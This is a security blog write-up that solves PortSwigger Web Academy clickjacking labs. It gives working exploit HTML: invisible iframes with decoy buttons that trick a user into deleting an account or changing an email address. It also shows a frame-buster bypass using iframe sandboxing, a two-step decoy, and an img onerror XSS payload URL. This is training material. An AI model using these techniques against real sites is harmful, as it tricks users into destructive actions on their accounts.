<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="(Portswigger/WebAcademy) - Clickjacking vulnerabilities" /><meta name="author" content="eng4ge" /><meta property="og:locale" content="en" /><meta name="description" content="Intro This post/writeup is all about the Clickjacking Vulnerabilities." /><meta property="og:description" content="Intro This post/writeup is all about the Clickjacking Vulnerabilities." /><link rel="canonical" href="https://an9k0r.github.io/posts/clickjacking/" /><meta property="og:url" content="https://an9k0r.github.io/posts/clickjacking/" /><meta property="og:site_name" content="CyberSec-Research.Space" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2023-01-15T08:00:00+01:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="(Portswigger/WebAcademy) - Clickjacking vulnerabilities" /><meta name="twitter:site" content="@cybersec_space" /><meta name="twitter:creator" content="@eng4ge" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"eng4ge"},"description":"Intro This post/writeup is all about the Clickjacking Vulnerabilities.","headline":"(Portswigger/WebAcademy) - Clickjacking vulnerabilities","dateModified":"2023-01-15T08:00:00+01:00","url":"https://an9k0r.github.io/posts/clickjacking/","datePublished":"2023-01-15T08:00:00+01:00","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://an9k0r.github.io/posts/clickjacking/"},"@context":"https://schema.org"}</script><title>(Portswigger/WebAcademy) - Clickjacking vulnerabilities | CyberSec-Research.Space</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="CyberSec-Research.Space"><meta name="application-name" content="CyberSec-Research.Space"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/images/logo.jpeg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">CyberSec-Research.Space</a></div><div class="site-subtitle font-italic">Information Security Personal Blog</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/blogging/" class="nav-link"> <i class="fa-fw fas fa-book ml-xl-3 mr-xl-3 unloaded"></i> <span>BLOGS AND GUIDES</span> </a><li class="nav-item"> <a href="/hack_the_box/" class="nav-link"> <i class="fa-fw fas fa-bug ml-xl-3 mr-xl-3 unloaded"></i> <span>HACK THE BOX</span> </a><li class="nav-item"> <a href="/blue_team_ctf/" class="nav-link"> <i class="fa-fw fas fa-anchor ml-xl-3 mr-xl-3 unloaded"></i> <span>BLUE TEAM CTFS</span> </a><li class="nav-item"> <a href="/web_application/" class="nav-link"> <i class="fa-fw fas fa-terminal ml-xl-3 mr-xl-3 unloaded"></i> <span>WEB APPLICATION</span> </a><li class="nav-item"> <a href="/binary_exploitation/" class="nav-link"> <i class="fa-fw fas fa-microchip ml-xl-3 mr-xl-3 unloaded"></i> <span>BINARY EXPLOITATION</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/an9k0r" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/cybersec_space" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['',''].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>(Portswigger/WebAcademy) - Clickjacking vulnerabilities</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>(Portswigger/WebAcademy) - Clickjacking vulnerabilities</h1><div class="post-meta text-muted"><div> By <em> <a href="https://github.com/an9k0r">eng4ge</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" date="2023-01-15 08:00:00 +0100" data-toggle="tooltip" data-placement="bottom" title="Sun, Jan 15, 2023, 8:00 AM +0100" >Jan 15</em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="920 words"> <em>5 min</em> read</span></div></div></div><div class="post-content"><h1 id="intro">Intro</h1><p>This post/writeup is all about the Clickjacking Vulnerabilities.</p><p>I’ll be using primarily <a href="https://portswigger.net/web-security/clickjacking">Portswigger Web Academy</a> Labs, but i do intent do throw other labs and writeups here as well.</p><p>To learn more on the topic, please visit the article linked above at Portswigger’s.</p><h2 id="toc">TOC<a href="#toc" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ul><li><a href="#intro">Intro</a><ul><li><a href="#toc">TOC</a></ul><li><a href="#basic-clickjacking-with-csrf-token-protection">Basic clickjacking with CSRF token protection</a><li><a href="#clickjacking-with-form-input-data-prefilled-from-a-url-parameter">Clickjacking with form input data prefilled from a URL parameter</a><li><a href="#clickjacking-with-a-frame-buster-script">Clickjacking with a frame buster script</a><li><a href="#exploiting-clickjacking-vulnerability-to-trigger-dom-based-xss">Exploiting clickjacking vulnerability to trigger DOM-based XSS</a><li><a href="#multistep-clickjacking">Multistep clickjacking</a></ul><h1 id="basic-clickjacking-with-csrf-token-protection">Basic clickjacking with CSRF token protection</h1><blockquote><p>This lab contains login functionality and a delete account button that is protected by a CSRF token. A user will click on elements that display the word “click” on a decoy website.</p><p>To solve the lab, craft some HTML that frames the account page and fools the user into deleting their account. The lab is solved when the account is deleted. You can log in to your own account using the following credentials: wiener:peter</p></blockquote><p>First we have to login. TL:DR; The target website does not have any clickjacking protection.</p><p>This is the payload page that victim will open:</p><div class="language-html highlighter-rouge"><div class="code-header"> <span label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre><span class="nt">&lt;head&gt;</span>
	<span class="nt">&lt;style&gt;</span>
		<span class="nf">#target_website</span> <span class="p">{</span>
			<span class="nl">position</span><span class="p">:</span><span class="nb">relative</span><span class="p">;</span>
			<span class="nl">width</span><span class="p">:</span><span class="m">700px</span><span class="p">;</span>
			<span class="nl">height</span><span class="p">:</span><span class="m">600px</span><span class="p">;</span>
			<span class="nl">opacity</span><span class="p">:</span><span class="m">0.00001</span><span class="p">;</span>
			<span class="nl">z-index</span><span class="p">:</span><span class="m">2</span><span class="p">;</span>
			<span class="p">}</span>
		<span class="nf">#decoy_website</span> <span class="p">{</span>
			<span class="nl">position</span><span class="p">:</span><span class="nb">absolute</span><span class="p">;</span>
			<span class="nl">top</span><span class="p">:</span><span class="m">492px</span><span class="p">;</span>
			<span class="nl">left</span><span class="p">:</span><span class="m">70px</span><span class="p">;</span>
			<span class="nl">z-index</span><span class="p">:</span><span class="m">1</span><span class="p">;</span>
			<span class="p">}</span>
	<span class="nt">&lt;/style&gt;</span>
<span class="nt">&lt;/head&gt;</span>
<span class="nt">&lt;body&gt;</span>
	<span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"decoy_website"</span><span class="nt">&gt;</span>
	Click Me
	<span class="nt">&lt;/div&gt;</span>
	<span class="nt">&lt;iframe</span> <span class="na">id=</span><span class="s">"target_website"</span> <span class="na">src=</span><span class="s">"https://0a3c00b7033112208526365100e5001e.web-security-academy.net/my-account"</span><span class="nt">&gt;</span>
	<span class="nt">&lt;/iframe&gt;</span>
<span class="nt">&lt;/body&gt;</span>
</pre></table></code></div></div><p>For the screenshot i have changed the <code class="language-plaintext highlighter-rouge">z-index</code> of the decoy so it get’s visible and as seen below, it should be placed above the button <code class="language-plaintext highlighter-rouge">Delete Account</code>:</p><p><img data-src="/assets/images/8f99087a7da010c77057b82c2102573581df0c584087c08ba1690b4f2c01f2f1.png" alt="picture 0" data-proofer-ignore></p><p>This is the page that victim would see:</p><p><img data-src="/assets/images/4aba040945c310d4acd9d090300b35ae70610cd85b66c7677648c4e9626d2012.png" alt="picture 1" data-proofer-ignore></p><h1 id="clickjacking-with-form-input-data-prefilled-from-a-url-parameter">Clickjacking with form input data prefilled from a URL parameter</h1><blockquote><p>This lab extends the basic clickjacking example in Lab: Basic clickjacking with CSRF token protection. The goal of the lab is to change the email address of the user by prepopulating a form using a URL parameter and enticing the user to inadvertently click on an “Update email” button.</p><p>To solve the lab, craft some HTML that frames the account page and fools the user into updating their email address by clicking on a “Click me” decoy. The lab is solved when the email address is changed.</p><p>You can log in to your own account using the following credentials: wiener:peter</p></blockquote><p>This lab is same as the last one, we just have to find a way to prepopulate a field in a form which will trigger a POST request with value that we (as attacker) have set.</p><p>As seen below, we can use <code class="language-plaintext highlighter-rouge">email</code> in a GET request to achieve that.</p><p><img data-src="/assets/images/4977ca1854862e3d1cced270102755a2cc31a9f13b85b645bc051130a7314446.png" alt="picture 2" data-proofer-ignore></p><p>This is the code that worked for me:</p><div class="language-html highlighter-rouge"><div class="code-header"> <span label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre><span class="nt">&lt;style&gt;</span>
    <span class="nt">iframe</span> <span class="p">{</span>
        <span class="nl">position</span><span class="p">:</span><span class="nb">relative</span><span class="p">;</span>
        <span class="nl">width</span><span class="p">:</span><span class="m">780px</span><span class="p">;</span>
        <span class="nl">height</span><span class="p">:</span> <span class="m">600px</span><span class="p">;</span>
        <span class="nl">opacity</span><span class="p">:</span> <span class="m">0.00001%</span><span class="p">;</span>
        <span class="nl">z-index</span><span class="p">:</span> <span class="m">2</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="nt">div</span> <span class="p">{</span>
        <span class="nl">position</span><span class="p">:</span><span class="nb">absolute</span><span class="p">;</span>
        <span class="nl">top</span><span class="p">:</span><span class="m">454px</span><span class="p">;</span>
        <span class="nl">left</span><span class="p">:</span><span class="m">70px</span><span class="p">;</span>
        <span class="nl">z-index</span><span class="p">:</span> <span class="m">1</span><span class="p">;</span>
    <span class="p">}</span>
<span class="nt">&lt;/style&gt;</span>
<span class="nt">&lt;div&gt;</span>Click Me<span class="nt">&lt;/div&gt;</span>
<span class="nt">&lt;iframe</span> <span class="na">src=</span><span class="s">"https://0aaa008d03d1128b85934f6f00950027.web-security-academy.net/my-account?email=test@attacker.de"</span><span class="nt">&gt;&lt;/iframe&gt;</span>
</pre></table></code></div></div><h1 id="clickjacking-with-a-frame-buster-script">Clickjacking with a frame buster script</h1><blockquote><p>This lab is protected by a frame buster which prevents the website from being framed. Can you get around the frame buster and conduct a clickjacking attack that changes the users email address?</p><p>To solve the lab, craft some HTML that frames the account page and fools the user into changing their email address by clicking on “Click me”. The lab is solved when the email address is changed.</p><p>You can log in to your own account using the following credentials: wiener:peter</p></blockquote><p>Same lab as before, we just need to bypass frame buster by sandboxing the iframe.</p><div class="language-html highlighter-rouge"><div class="code-header"> <span label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre><span class="nt">&lt;style&gt;</span>
    <span class="nt">iframe</span> <span class="p">{</span>
        <span class="nl">position</span><span class="p">:</span><span class="nb">relative</span><span class="p">;</span>
        <span class="nl">width</span><span class="p">:</span><span class="m">780px</span><span class="p">;</span>
        <span class="nl">height</span><span class="p">:</span> <span class="m">600px</span><span class="p">;</span>
        <span class="nl">opacity</span><span class="p">:</span> <span class="m">0.00001</span><span class="p">;</span>
        <span class="nl">z-index</span><span class="p">:</span> <span class="m">2</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="nt">div</span> <span class="p">{</span>
        <span class="nl">position</span><span class="p">:</span><span class="nb">absolute</span><span class="p">;</span>
        <span class="nl">top</span><span class="p">:</span><span class="m">449px</span><span class="p">;</span>
        <span class="nl">left</span><span class="p">:</span><span class="m">70px</span><span class="p">;</span>
        <span class="nl">z-index</span><span class="p">:</span> <span class="m">1</span><span class="p">;</span>
    <span class="p">}</span>
<span class="nt">&lt;/style&gt;</span>
<span class="nt">&lt;div&gt;</span>Click Me<span class="nt">&lt;/div&gt;</span>
<span class="nt">&lt;iframe</span> <span class="na">sandbox=</span><span class="s">"allow-forms"</span>
<span class="na">src=</span><span class="s">"https://0a4e001804ae73c880ca031700cf00e7.web-security-academy.net/my-account?email=wiener@changed.de"</span><span class="nt">&gt;&lt;/iframe&gt;</span>
</pre></table></code></div></div><h1 id="exploiting-clickjacking-vulnerability-to-trigger-dom-based-xss">Exploiting clickjacking vulnerability to trigger DOM-based XSS</h1><blockquote><p>This lab contains an XSS vulnerability that is triggered by a click. Construct a clickjacking attack that fools the user into clicking the “Click me” button to call the print() function.</p></blockquote><p>First we need to find a DOM XSS. I have used DOM Invader for that purpose:</p><p><img data-src="/assets/images/921cd528d337bb398d68ff7ce68c6c50e0bdc7e6333885358e1b4f9dbd20093c.png" alt="picture 3" data-proofer-ignore></p><p>Page has no clickjacking protection so we can prefill the values by using them in a GET request as seen below:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>https://0a48002204bfa14b8080443700f100bc.web-security-academy.net/feedback?message=test&amp;name=%3Cimg%20src%20onerror=print()%3E&amp;email=a@a.de&amp;subject=test
</pre></table></code></div></div><p>When submitting, <code class="language-plaintext highlighter-rouge">print()</code> should fire.</p><h1 id="multistep-clickjacking">Multistep clickjacking</h1><blockquote><p>This lab has some account functionality that is protected by a CSRF token and also has a confirmation dialog to protect against Clickjacking. To solve this lab construct an attack that fools the user into clicking the delete account button and the confirmation dialog by clicking on “Click me first” and “Click me next” decoy actions</p><p>You will need to use two elements for this lab.</p><p>You can log in to the account yourself using the following credentials: wiener:peter</p></blockquote><p>This lab is protected by additional page when wanting to delete the account.</p><p>After logging in:</p><p><img data-src="/assets/images/d17e907aae59e573cfce0e7656e45a646c0b0254200ad4285dd0438974844d69.png" alt="picture 4" data-proofer-ignore></p><p>After clicking on <code class="language-plaintext highlighter-rouge">Delete account</code>:</p><p><img data-src="/assets/images/bf4b5bf1de70e71654c18f04bb6b923a96e693b1d07ca9030919a4a001ddab32.png" alt="picture 5" data-proofer-ignore></p><p>Because of the SOP, there we are limited what to do. Basically we display both <code class="language-plaintext highlighter-rouge">CLick me</code> buttons at once and the right places, so first click and second click align with buttons in an iframe that lead to account deletion.</p><div class="language-html highlighter-rouge"><div class="code-header"> <span label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre><td class="rouge-code"><pre><span class="nt">&lt;style&gt;</span>
    <span class="nt">iframe</span> <span class="p">{</span>
        <span class="nl">position</span><span class="p">:</span><span class="nb">relative</span><span class="p">;</span>
        <span class="nl">width</span><span class="p">:</span><span class="m">780px</span><span class="p">;</span>
        <span class="nl">height</span><span class="p">:</span> <span class="m">600px</span><span class="p">;</span>
        <span class="nl">opacity</span><span class="p">:</span> <span class="m">0.00001</span><span class="p">;</span>
        <span class="nl">z-index</span><span class="p">:</span> <span class="m">2</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="nf">#div1</span><span class="o">,</span> <span class="nf">#div2</span> <span class="p">{</span>
        <span class="nl">position</span><span class="p">:</span><span class="nb">absolute</span><span class="p">;</span>
        <span class="nl">top</span><span class="p">:</span><span class="m">492px</span><span class="p">;</span>
        <span class="nl">left</span><span class="p">:</span><span class="m">70px</span><span class="p">;</span>
        <span class="nl">z-index</span><span class="p">:</span> <span class="m">1</span><span class="p">;</span>
    <span class="p">}</span>
     <span class="nf">#div2</span> <span class="p">{</span>
    <span class="nl">top</span><span class="p">:</span> <span class="m">292px</span><span class="p">;</span>
    <span class="nl">left</span><span class="p">:</span> <span class="m">207px</span><span class="p">;</span>
<span class="p">}</span>
     
<span class="nt">&lt;/style&gt;</span>

<span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"div1"</span><span class="nt">&gt;</span>Click me first<span class="nt">&lt;/div&gt;</span>
<span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"div2"</span><span class="nt">&gt;</span>Click me next<span class="nt">&lt;/div&gt;</span>
<span class="nt">&lt;iframe</span> <span class="na">id =</span><span class="s">"iframe"</span> 
<span class="na">src=</span><span class="s">"https://0a1e001a038a370a805fc16900b7002e.web-security-academy.net/my-account"</span><span class="nt">&gt;&lt;/iframe&gt;</span>
</pre></table></code></div></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/web-application/'>Web Application</a>, <a href='/categories/clickjacking-vulnerabilities/'>Clickjacking vulnerabilities</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/notes/" class="post-tag no-text-decoration" >Notes</a> <a href="/tags/clickjacking-vulnerabilities/" class="post-tag no-text-decoration" >Clickjacking vulnerabilities</a> <a href="/tags/portswigger/" class="post-tag no-text-decoration" >Portswigger</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=(Portswigger/WebAcademy) - Clickjacking vulnerabilities - CyberSec-Research.Space&url=https://an9k0r.github.io/posts/clickjacking/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=(Portswigger/WebAcademy) - Clickjacking vulnerabilities - CyberSec-Research.Space&u=https://an9k0r.github.io/posts/clickjacking/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=(Portswigger/WebAcademy) - Clickjacking vulnerabilities - CyberSec-Research.Space&url=https://an9k0r.github.io/posts/clickjacking/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/insecure_deserialization/">(Portswigger/WebAcademy) - Insecure Deserialization vulnerabilities</a><li><a href="/posts/ssti/">(Portswigger/WebAcademy) - Server-Side Template Injection vulnerabilities</a><li><a href="/posts/stored_XSS/">(Portswigger/WebAcademy) - Stored Cross-Site Scripting (XSS)</a><li><a href="/posts/Blind_SQL_Injection/">Blind SQL Injection</a><li><a href="/posts/OS_Command_Injection/">OS Command Injection</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/notes/">Notes</a> <a class="post-tag" href="/tags/portswigger/">Portswigger</a> <a class="post-tag" href="/tags/web-application/">Web Application</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/clear-text-credentials/">Clear Text Credentials</a> <a class="post-tag" href="/tags/password-reuse/">Password Reuse</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/deserialization/">Deserialization</a> <a class="post-tag" href="/tags/misconfiguration/">Misconfiguration</a> <a class="post-tag" href="/tags/password-cracking/">Password Cracking</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/ssti/"><div class="card-body"> <em class="timeago small" date="2023-01-15 08:00:00 +0100" >Jan 15</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>(Portswigger/WebAcademy) - Server-Side Template Injection vulnerabilities</h3><div class="text-muted small"><p> Intro This post/writeup is all about the Clickjacking Vulnerabilities. I’ll be using primarily Portswigger Web Academy Labs, but i do intent do throw other labs and writeups here as well. To lear...</p></div></div></a></div><div class="card"> <a href="/posts/websockets/"><div class="card-body"> <em class="timeago small" date="2023-01-15 08:00:00 +0100" >Jan 15</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>(Portswigger/WebAcademy) - Websockets</h3><div class="text-muted small"><p> Intro This post/writeup is all about the insecure deserialization vulnerabilities. I’ll be using primarily Portswigger Web Academy Labs, but i do intent do throw other labs and writeups here as we...</p></div></div></a></div><div class="card"> <a href="/posts/DOM_based_vulns/"><div class="card-body"> <em class="timeago small" date="2023-01-15 08:00:00 +0100" >Jan 15</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>(Portswigger/WebAcademy) - DOM-based Vulnerabilities</h3><div class="text-muted small"><p> Intro This post/writeup is all about the DOM-based Vulnerabilitiess. I’ll be using primarily Portswigger Web Academy Labs, but i do intent do throw other labs and writeups here as well. To learn ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/simple-docker-tutorial/" class="btn btn-outline-primary" prompt="Older"><p>Simple Docker Tutorial</p></a> <a href="/posts/ssti/" class="btn btn-outline-primary" prompt="Newer"><p>(Portswigger/WebAcademy) - Server-Side Template Injection vulnerabilities</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/cybersec_space">eng4ge</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/notes/">Notes</a> <a class="post-tag" href="/tags/portswigger/">Portswigger</a> <a class="post-tag" href="/tags/web-application/">Web Application</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/clear-text-credentials/">Clear Text Credentials</a> <a class="post-tag" href="/tags/password-reuse/">Password Reuse</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/deserialization/">Deserialization</a> <a class="post-tag" href="/tags/misconfiguration/">Misconfiguration</a> <a class="post-tag" href="/tags/password-cracking/">Password Cracking</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><script 